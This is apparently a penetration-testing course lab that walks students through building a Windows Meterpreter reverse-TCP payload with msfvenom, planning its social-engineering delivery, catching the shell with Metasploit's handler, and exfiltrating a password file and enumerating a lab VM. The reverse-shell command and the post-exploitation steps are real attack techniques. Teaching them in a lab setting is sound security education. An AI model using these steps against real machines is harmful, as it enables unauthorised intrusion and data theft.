## Activity File: Meterpreter Shells

In this activity, you will play the role of an independent penetration tester.

- You've been hired by Unhackable Inc. to perform a no view test against one of the company's servers to determine if the existing security controls are adequate.

- Your goal is to hack into Unhackable, Inc.'s web server and do the following: 
  - Search the remote filesystem for JPG files.
  - Search for the `password.txt` file and exfiltrate it to your local machine.

- As a bonus, the company has also asked that you:
  - Enumerate share running on the breached machine.
  - Check if the remote machine is running inside of a VM.
  - List all users on the breached machine.

You will be using the following machines: 

- Attacking machine: Kali Linux
   - Username: `root`
   - Password: `toor`

- Victim machine: DVW10 
   - Username: `IEuser`
   - Password: `Passw0rd!`

### Instructions

1. In Kali, create an executable payload for the target machine using `msfvenom`. You have been provided a template command to create your exploit.

   Type and run the following command, but remember to update the `LHOST` with the correct IP:

     - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe > hack.exe`

   **Note**: We'll cover custom payloads in the next lesson. For now, just know that this payload will create a malicious `hack.exe` file. 

2. Remember, once the payload is created, the attacker needs to get their payload onto the victim's computer. For this activity, assume that your payload reached the victim's machine via social engineering. 

   In one or two sentences, describe how you might have used social engineering to deliver this payload to the victim machine. 

      
3. In DVW10, verify that `hack.exe` is on the victim machine:

   * Navigate to the Downloads folder on the DVW10 VM and locate the EXE file.

     - Do not click on the file just yet. 

4. Return to Kali and run the commands needed to establish the reverse connection once the file has been executed:
   
   - Launch the MSFconsole in preparation for establishing the reverse connection. Then run the commands that will do the following tasks:

      - Launch MSFconsole.

      - Load the `exploit/multi/handler`.

      - Set the payload to `windows/meterpreter/reverse_tcp`.

      - View the payload's options.

      - Set `LHOST` to the IP of your Kali machine.

      - Set the `LPORT` to `4444` of your Kali machine. 

      - Verify the option settings took effect.

5. Run the exploit.

    - **Note:** If you do not get a Meterpreter shell after a minute or two, go to the DVW10 machine and double-click the `hack.exe` file to restart the listener.
  
    - Long idle times may cause the listener to close the connection. Double-clicking `hack.exe` forces the connection back up.

6. Now we will explore the exploited machine and begin our hunt for the target information.

   - As a warm-up, run the Meterpreter command that searches for files on the remote host.

   - If needed, read the help menu for the `search` command before using it.

     - Run: `search -h` 

7. Let's begin the hunt:

   - Search the remote filesystem for all files ending with `.jpg`.

   - Search the remote filesystem for a file called `password`.
   
   - Exfiltrate this file from the DVW10 VM.
     

#### Bonus

Although security professionals are not expected to be familiar with every module and payload offered in Metasploit and Meterpreter, you will be expected to find the tools you need through online searches. 

Try to complete the following tasks: 

- Find and use a post-exploitation module that enumerates network shares (Windows Gather SMB Share Enumeration via Registry) on the DVW10 machine.

- Find and use a post-exploitation module that checks if the DVW10 computer is running inside a VM.

- Launch a command shell within Meterpreter and perform enumeration that displays user account information on the breached DVW10 computer.

What were the commands that you used? Be prepared to share with the class. 

____

&copy; 2020 Trilogy Education Services, a 2U Inc Brand. All Rights Reserved.
